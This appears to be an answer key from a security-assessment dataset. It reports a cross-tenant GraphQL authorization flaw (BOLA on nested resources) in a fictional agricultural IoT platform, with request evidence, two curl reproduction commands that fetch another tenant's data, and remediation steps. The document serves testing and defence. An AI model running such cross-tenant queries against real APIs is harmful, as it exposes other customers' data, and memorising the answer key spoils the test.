# Expected Response

## System
- Domain: Agriculture / AgriTech IoT
- System: HarvestIQ IoT Platform
- Example ID: GQL-0072

## Priority Findings

### Finding 1: Cross-Tenant Nested Agricultural IoT Resource Access Without Parent Authorization (Pattern 1.7)
**Severity:** High
**Category:** BOLA / Nested Resources

**Summary:**
Per §5.0 (Pattern 1.7 — nested resources without parent authorization): The resolver handling `resourceId` does not enforce ownership at nested resource levels. An attacker from `tenant-27b6` supplied `tenantId: "tenant-82f1"` in `listResources` to access IoT sensor/device records belonging to another agricultural operation. Nested resource traversal (via `getResourceWithChildren` — child IoT items) also lacks parent authorization. In AgriTech, this exposes precision farming data, crop yield records, and sensor telemetry.

**Evidence from HAR:**
- Request: `POST https://api.harvestiq-iot-plat.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-27b6`
- Query: `listResources(tenantId: "tenant-82f1") { resourceId ownerId data { sensitiveField } }`
- Response `200 OK`; `tenantId: "tenant-82f1"`, `ownerId: "other-user-27b682f1"`, `sensitiveField: "CONFIDENTIAL-27b682f1"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-27b682f1`

## Steps to Reproduce

### Step 1 — Cross-tenant IoT resource list (HAR)
```bash
curl -s -X POST https://api.harvestiq-iot-plat.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-27b6" \
  -d '{"query": "query VulnerableOp { listResources(tenantId: \"tenant-82f1\") { resourceId ownerId data { sensitiveField } } }"}'
```
**Vulnerable:** Returns `CONFIDENTIAL-27b682f1` from `tenant-82f1`. **Secure:** FORBIDDEN.

### Step 2 — Nested resource traversal without parent authorization
```bash
curl -s -X POST https://api.harvestiq-iot-plat.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-27b6" \
  -d '{"query": "query { getResourceWithChildren(id: \"R-2072\") { resourceId tenantId items { resourceId tenantId data { sensitiveField } } } }"}'
```
**Vulnerable:** Nested child items (IoT sensors/devices) from `tenant-82f1` returned.

## Remediation
1. `listResources` must use JWT `tenantId` — discard client-supplied argument.
2. Resolver tenant guard on all nested resolvers including `getResourceWithChildren`.
3. Parent tenantId re-validated at each nested level.
4. Redis cache key: `resource:{tenantId}:{resourceId}`.
